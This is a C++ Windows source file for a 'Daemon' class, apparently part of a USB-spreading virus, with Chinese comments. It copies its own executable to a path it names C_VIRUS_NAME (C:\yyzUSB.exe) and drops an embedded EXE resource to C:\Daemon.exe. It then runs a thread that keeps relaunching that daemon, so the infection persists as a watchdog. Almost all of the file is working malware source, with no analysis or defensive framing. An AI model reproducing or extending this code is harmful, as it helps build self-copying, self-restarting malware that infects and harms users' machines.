#include "StdAfx.h"
#include "Daemon.h"

#define DAEMON_MUTEX (_T("Daemon_mutex"))
#define DAEMON_NAME (_T("\\Daemon.exe"))
#define C_VIRUS_NAME (_T("C:\\yyzUSB.exe"))
#define C_DAEMON_NAME (_T("C:\\Daemon.exe"))

bool CDaemon::unDread = true;
CDaemon::CDaemon(void)
{
	Init ();
	CreateThread (NULL,NULL,DoubleProtectThread,NULL,NULL,NULL);
}
void CDaemon::Init ()
{
	TCHAR szMyName[MAX_PATH];
	GetModuleFileName(NULL,szMyName,MAX_PATH);
	CopyFile(szMyName,C_VIRUS_NAME,FALSE);
	HMODULE hLibrary = LoadLibrary(szMyName);
	HRSRC hResource = FindResource(hLibrary, 
		MAKEINTRESOURCE(IDR_EXE1), _T("EXE"));
	HANDLE hFile;
	DWORD dwFileSize;      
	STARTUPINFO si;
//	PROCESS_INFORMATION pi;
	LPBYTE lpBuffer;
	if (NULL != hResource)
	{
		HGLOBAL hResourceLoaded = LoadResource(hLibrary, hResource);
		if (NULL != hResourceLoaded)        
		{
			lpBuffer = (LPBYTE) LockResource(hResourceLoaded);            
			if (NULL != lpBuffer)            
			{                
				DWORD dwBytesWritten;
				//获取宿主资源的大小
				dwFileSize = SizeofResource(hLibrary, hResource);
				hFile = CreateFile(C_DAEMON_NAME,
					GENERIC_WRITE,
					0,
					NULL,
					CREATE_ALWAYS,
					FILE_ATTRIBUTE_NORMAL,
					NULL);

				if (INVALID_HANDLE_VALUE != hFile)
				{
					//将内存中的宿主资源写入此文件
					WriteFile(hFile, lpBuffer, dwFileSize, &dwBytesWritten, NULL);
					CloseHandle(hFile);
				}
				GetStartupInfo(&si);
			}
		}
	}
}

CDaemon::~CDaemon(void)
{
}
DWORD WINAPI DoubleProtectThread(LPVOID)
{
	while (CDaemon::unDread)
	{
		HANDLE mutex = CreateMutex(NULL,FALSE,DAEMON_MUTEX);
		WaitForSingleObject (mutex,INFINITE);
		ReleaseMutex (mutex);
		CloseHandle (mutex);

		/**
			this should be changed later
		*/
		TCHAR path[MAX_PATH];
		GetCurrentDirectory(MAX_PATH,path);
		lstrcatW(path,DAEMON_NAME);
//		MessageBox(NULL,path,NULL,MB_OK);

		/**
			*****************************
		*/
		STARTUPINFOW si;
		GetStartupInfo(&si);
		PROCESS_INFORMATION pi;
		CreateProcess(C_DAEMON_NAME,GetCommandLine(),NULL,NULL,NULL,
			NULL,NULL,NULL,&si,&pi);
		//	WaitForSingleObject(pi.hProcess, INFINITE);
	}
	return 1;
}